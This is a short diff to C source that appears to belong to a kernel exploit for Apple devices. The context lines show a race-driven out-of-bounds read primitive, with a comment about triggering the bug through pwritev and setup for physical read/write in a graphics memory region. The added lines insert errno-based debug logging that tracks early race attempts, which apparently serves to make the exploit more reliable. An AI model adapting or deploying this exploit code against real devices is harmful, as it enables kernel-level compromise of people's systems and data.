@@ -5,6 +5,7 @@
 #include <unistd.h>
 
 #include "surface.h"
+#include <errno.h>
 
 // creates physically contiguous mapping in Purplegfxmem and sets marker to it
 void cs2_init_phys_rw(mach_vm_size_t contiguous_mapping_size) {
@@ -32,6 +33,8 @@ void cs2_init_phys_rw(mach_vm_size_t contiguous_mapping_size) {
     atomic_store_explicit(&cs2_ctx.shared->go_sync, 1, memory_order_seq_cst);
 }
 
+static uint64_t first_try_logs = 0;
+
 kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
     // target_object_sync here on first pass is set to memory_object from mem entry
     atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
@@ -55,6 +58,9 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
         atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
         // trigger bug to read oob_offset oob
         w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
+        if (try_idx == 0 && first_try_logs++ < 6)
+            LOG("oob try0: w=%zd errno=%d (win-cap=%llu)", w, errno,
+                (unsigned long long)cs2_ctx.highiest_success_idx);
         while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);
         mach_vm_address_t map_addr = cs2_ctx.pc_address;
         // put physicallly contiguous mapping back
